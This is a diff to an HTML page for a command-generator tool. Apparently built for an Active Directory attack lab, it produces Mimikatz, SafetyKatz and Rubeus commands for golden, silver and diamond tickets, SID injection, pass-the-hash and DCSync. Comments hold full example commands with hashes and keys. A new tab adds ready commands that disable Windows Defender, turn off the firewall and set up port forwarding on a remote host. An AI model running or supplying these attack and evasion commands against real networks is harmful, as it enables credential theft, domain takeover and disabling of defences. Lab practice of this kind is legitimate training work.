@@ -33,7 +33,7 @@
                 <input type="text" class="form-control" id="parent-sid" name="ticket" required>
             </div>
             <div class="form-group">
-                <label for="krbtgt">KRBTGT RC4:</label>
+                <label for="krbtgt">KRB RC4:</label>
                 <input type="text" class="form-control" id="krbtgt" name="rc4" required>
             </div>
             <div class="form-group">
@@ -42,6 +42,8 @@
             </div>
         </form>
         
+        <pre class="text-info">Provide FQDNs for domains</pre>
+        
         <!-- Tabs -->
         <ul class="nav nav-tabs">
             <!-- <li><a class="nav-link" data-toggle="tab" href="#nav-cross-forest">Cross Forest</a></li> -->
@@ -49,15 +51,16 @@
             <li><a class="nav-link" data-toggle="tab" href="#nav-kerberor-tickets">Kerberos Tickets</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-dump-hashes">Dump Hashes</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-delegation">Delegation</a></li>
+            <li><a class="nav-link" data-toggle="tab" href="#nav-bypass-av">Bypass AV</a></li>
         </ul>
         
         <!-- Tab Content -->
         <div class="tab-content mt-4" id="nav-tabContent">
             <!-- Cross Forest
                 <div class="tab-pane fade" id="nav-cross-forest" role="tabpanel" aria-labelledby="nav-cross-forest-tab">
-                    <div class="btn-group mb-3" role="group" id="tool-buttons" data-toggle="buttons">
+                    <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
                         <label class="btn btn-outline-dark btn-secondary">
-                            <input id="tool-btn" type="radio" name="tool" autocomplete="off" checked data-tool="Safetykatz.exe"> Safetykatz
+                            <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
                         </label>
                         <label class="btn btn-outline-dark btn-secondary">
                             <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
@@ -97,7 +100,7 @@
                             <div class="input-group mb-5">
                                 <input id="command-cross-forest" type="text" class="form-control">
                                 <div class="input-group-append">
-                                    <button class="btn btn-primary" type="button" onclick="copyToClipboard()">
+                                    <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                         <i class="fas fa-copy"></i> Copy
                                     </button>
                                 </div>
@@ -109,9 +112,9 @@
             
             <!-- Inter Forest -->
             <div class="tab-pane fade" id="nav-inter-forest" role="tabpanel" aria-labelledby="nav-inter-forest-tab">
-                <div class="btn-group mb-3" role="group" id="tool-buttons" data-toggle="buttons">
+                <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
                     <label class="btn btn-outline-dark btn-secondary">
-                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" checked data-tool="Safetykatz.exe"> Safetykatz
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
                     </label>
                     <label class="btn btn-outline-dark btn-secondary">
                         <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
@@ -130,6 +133,9 @@
                 <!-- SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e2f785b90d3a0e627e171a90f403f260 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit" -->
                 <form id="form-sid-injection">
                     <h3>SID Injection</h3>
+                    <p>Domain Admin To Enterprise Admin</p>
+                    <pre class="text-info">- Use either Trust key or KRBTGT hash</pre>
+                    <pre class="text-info">- Appends "519" to parent domain SID</pre>
                     <div class="form-group">
                         <label for="trust-ntlm">KRBTGT (NTLM):</label>
                         <input type="text" class="form-control" id="trust-ntlm" name="t-ntlm">
@@ -143,6 +149,10 @@
                         <input type="text" value="Administrator" class="form-control" id="user" name="user" required>
                     </div>
                     <div class="form-group">
+                        <label for="uid">User ID:</label>
+                        <input type="text" value="500" class="form-control" id="uid" name="uid" required>
+                    </div>
+                    <div class="form-group">
                         <label for="current-domain">Current Domain:</label>
                         <input type="text" class="form-control" id="current-domain" name="current-domain" required>
                     </div>
@@ -151,7 +161,7 @@
                         <input type="text" class="form-control" id="current-sid" name="current-sid">
                     </div>
                     <div class="form-group">
-                        <label for="parent-sid">Parent Domain SID:</label>
+                        <label for="parent-sid">Parent/Target Domain SID:</label>
                         <input type="text" class="form-control" id="parent-sid" name="parent-sid" required>
                     </div>
                     <div class="form-group">
@@ -159,8 +169,16 @@
                         <input type="text" value="krbtgt" class="form-control" id="service" name="service">
                     </div>
                     <div class="form-group">
-                        <label for="target-domain">Target Domain:</label>
+                        <label for="target-domain">Parent/Target Domain:</label>
                         <input type="text" class="form-control" id="target-domain" name="target-domain" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="dc">Domain Controller:</label>
+                        <input type="text" class="form-control" id="dc" name="dc" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="netbios">NetBios:</label>
+                        <input type="text" class="form-control" id="netbios" name="netbios" required>
                     </div>
                     <div class="form-group">
                         <label for="ticket-path">Ticket Path (.kirbi):</label>
@@ -170,25 +188,56 @@
                         <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
                     </div>
                 </form>
-                <div class="card bg-dark">
+                <!-- Command for KRBTGT -->
+                <div class="card bg-dark mb-5">
                     <div class="card-body">
-                        <div class="input-group mb-5">
-                            <input id="command-sid-injection" type="text" class="form-control">
+                        <p class="card-title">KRBTGT Command:</p>
+                        <div class="input-group">
+                            <input id="command-inter-krbtgt" type="text" class="form-control">
                             <div class="input-group-append">
-                                <button class="btn btn-primary" type="button" onclick="copyToClipboard()">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                     <i class="fas fa-copy"></i> Copy
                                 </button>
                             </div>
                         </div>
                     </div>
-                </div>                
+                </div>
+                <h4 class="text-success">Trust Key Commands</h4>
+                <!-- Command for Inter realm TGT  -->
+                <div class="card bg-dark mb-5">
+                    <div class="card-body">
+                        <p class="card-title">Inter Relam TGT Command:</p>
+                        <div class="input-group">
+                            <input id="command-inter-tgt" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Command for Inter realm TGS -->
+                <div class="card bg-dark mb-5">
+                    <div class="card-body">
+                        <p class="card-title">Inter Relam TGS Command:</p>
+                        <div class="input-group">
+                            <input id="command-inter-tgs" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
             
             <!-- Kerberos Tickets -->
             <div class="tab-pane fade" id="nav-kerberor-tickets" role="tabpanel" aria-labelledby="nav-kerberor-tickets-tab">
-                <div class="btn-group mb-3" role="group" id="tool-buttons" data-toggle="buttons">
+                <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
                     <label class="btn btn-outline-dark btn-secondary">
-                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" checked data-tool="Safetykatz.exe"> Safetykatz
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
                     </label>
                     <label class="btn btn-outline-dark btn-secondary">
                         <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
@@ -202,6 +251,55 @@
                     <label class="btn btn-outline-dark btn-secondary">
                         <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Invoke-Mimikatz"> Invoke-Mimikatz
                     </label>
+                </div>
+                
+                <!-- Pass The Hash -->
+                <!-- SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe" "exit" -->
+                <h3>Pass The Hash</h3>
+                <form id="form-pth">
+                    <div class="form-group">
+                        <label for="user">User:</label>
+                        <input type="text" class="form-control" id="user" name="user" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="current-domain">Domain:</label>
+                        <input type="text" class="form-control" id="current-domain" name="current-domain" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="aes256">AES 256 key:</label>
+                        <input type="text" class="form-control" id="aes256" name="aes256" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="rc4">NTML Hash:</label>
+                        <input type="text" class="form-control" id="rc4" name="rc4" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="startoffset">startoffset:</label>
+                        <input type="text" class="form-control" id="startoffset" name="startoffset" value="0" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="endin">endin:</label>
+                        <input type="text" class="form-control" id="endin" name="endin" value="600">
+                    </div>
+                    <div class="form-group">
+                        <label for="renewmax">renewmax:</label>
+                        <input type="text" class="form-control" id="renewmax" name="renewmax" value="10080">
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
+                    </div>                
+                </form>
+                <div class="card bg-dark mb-5">
+                    <div class="card-body">
+                        <div class="input-group">
+                            <input id="command-pth" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
                 </div>
                 
                 <!-- Silver Ticket -->
@@ -221,7 +319,7 @@
                         <input type="text" class="form-control" id="service" name="service" required>
                     </div>
                     <div class="form-group">
-                        <label for="rc4 hash">NTLM Hash:</label>
+                        <label for="rc4 hash">Service Account NTLM Hash:</label>
                         <input type="text" class="form-control" id="rc4" name="rc4">
                     </div>
                     <div class="form-group">
@@ -249,7 +347,7 @@
                         <div class="input-group">
                             <input id="command-silver" type="text" class="form-control">
                             <div class="input-group-append">
-                                <button class="btn btn-primary" type="button" onclick="copyToClipboard()">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                     <i class="fas fa-copy"></i> Copy
                                 </button>
                             </div>
@@ -270,7 +368,7 @@
                         <input type="text" class="form-control" id="current-domain" name="current-domain">
                     </div>
                     <div class="form-group">
-                        <label for="aes256">AES 256 key:</label>
+                        <label for="aes256">KRB AES 256 key:</label>
                         <input type="text" class="form-control" id="aes256" name="aes256" required>
                     </div>
                     <div class="form-group">
@@ -295,7 +393,7 @@
                         <div class="input-group">
                             <input id="command-golden" type="text" class="form-control">
                             <div class="input-group-append">
-                                <button class="btn btn-primary" type="button" onclick="copyToClipboard()">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                     <i class="fas fa-copy"></i> Copy
                                 </button>
                             </div>
@@ -304,7 +402,7 @@
                 </div>
                 
                 <!-- Diamond Ticket -->
-                <!-- safetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:$hash /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit" -->
+                <!-- Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt -->
                 <h3>Diamond tickets</h3>
                 <form id="form-diamond">
                     <div class="form-group">
@@ -312,19 +410,23 @@
                         <input type="text" value="Administrator" class="form-control" id="user" name="user" required>
                     </div>
                     <div class="form-group">
-                        <label for="target-domain">Target Domain:</label>
+                        <label for="target-domain">Target/Current Domain:</label>
                         <input type="text" class="form-control" id="target-domain" name="target-domain" required>
                     </div>
                     <div class="form-group">
-                        <label for="service">Service:</label>
-                        <input type="text" class="form-control" id="service" name="service" required>
+                        <label for="dc">Domain Controller:</label>
+                        <input type="text" class="form-control" id="dc" name="dc" required>
                     </div>
                     <div class="form-group">
-                        <label for="rc4 hash">NTLM Hash:</label>
-                        <input type="text" class="form-control" id="rc4" name="rc4">
+                        <label for="uid">ticket user id:</label>
+                        <input type="text" value="500" class="form-control" id="uid" name="uid" required>
                     </div>
                     <div class="form-group">
-                        <label for="diamond aes256">AES 256 key:</label>
+                        <label for="gid">Group id:</label>
+                        <input type="text" value="512" class="form-control" id="gid" name="gid" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="diamond aes256">KRB AES 256 key:</label>
                         <input type="text" class="form-control" id="aes256" name="aes256" required>
                     </div>
                     <div class="form-group">
@@ -336,7 +438,7 @@
                         <input type="text" class="form-control" id="endin" name="endin" value="600">
                     </div>
                     <div class="form-group">
-                        <label for="renewmax">endin:</label>
+                        <label for="renewmax">renewmax:</label>
                         <input type="text" class="form-control" id="renewmax" name="renewmax" value="10080">
                     </div>
                     <div class="form-group">
@@ -348,7 +450,7 @@
                         <div class="input-group">
                             <input id="command-diamond" type="text" class="form-control">
                             <div class="input-group-append">
-                                <button class="btn btn-primary" type="button" onclick="copyToClipboard()">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                     <i class="fas fa-copy"></i> Copy
                                 </button>
                             </div>
@@ -360,9 +462,9 @@
             <!-- Dump Hashes -->
             <!-- SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" -->
             <div class="tab-pane fade" id="nav-dump-hashes" role="tabpanel" aria-labelledby="nav-dump-hashes-tab">
-                <div class="btn-group mb-3" role="group" id="tool-buttons" data-toggle="buttons">
+                <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
                     <label class="btn btn-outline-dark btn-secondary">
-                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" checked data-tool="Safetykatz.exe"> Safetykatz
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
                     </label>
                     <label class="btn btn-outline-dark btn-secondary">
                         <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
@@ -394,7 +496,7 @@
                         <div class="input-group">
                             <input id="command-dump-hashes" type="text" class="form-control">
                             <div class="input-group-append">
-                                <button class="btn btn-primary" type="button" onclick="copyToClipboard()">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                     <i class="fas fa-copy"></i> Copy
                                 </button>
                             </div>
@@ -405,11 +507,19 @@
             
             <!-- Delegation -->
             <div class="tab-pane fade" id="nav-delegation" role="tabpanel" aria-labelledby="nav-delegation-tab">
-                <div class="btn-group mb-3" role="group">
-                    <button type="button" class="btn btn-outline-dark btn-secondary">Safetykatz</button>
-                    <button type="button" class="btn btn-outline-dark btn-secondary">Rubeus</button>
-                    <button type="button" class="btn btn-outline-dark btn-secondary">BetterSafetykatz</button>
-                    <button type="button" class="btn btn-outline-dark btn-secondary">Mimikatz</button>
+                <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
+                    </label>
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
+                    </label>
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Mimikatz.exe"> Mimikatz
+                    </label>
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Invoke-Mimikatz"> Invoke-Mimikatz
+                    </label>
                 </div>
                 
                 <!-- Unconstrained -->
@@ -418,6 +528,25 @@
                     <div class="form-group">
                         <label for="user">User:</label>
                         <input type="text" class="form-control" id="user" name="user" required>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Bypass AV -->
+            <div class="tab-pane fade" id="nav-bypass-av" role="tabpanel" aria-labelledby="nav-bypass-av-tab">
+                
+                <form>
+                    <div class="form-group mb-5">
+                        <label for="">Disable Widows Defender:</label>
+                        <input type="text" value="Set-MpPreference -DisableIOAVProtection $true -Verbose; Set-MpPreference -DisableRealtimeMonitoring $true -Verbose" class="form-control" id="ps-script" name="psc-script">
+                    </div>
+                    <div class="form-group mb-5">
+                        <label for="">Disable Windows Firewall:</label>
+                        <input type="text" value="netsh advfirewall set currentprofile state off" class="form-control" id="ps-script" name="psc-script">
+                    </div>
+                    <div class="form-group">
+                        <label>Port Forwarding</label>
+                        <input type="text" value='$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=' class="form-control" id="ps-script" name="psc-script">
                     </div>
                 </form>
             </div>
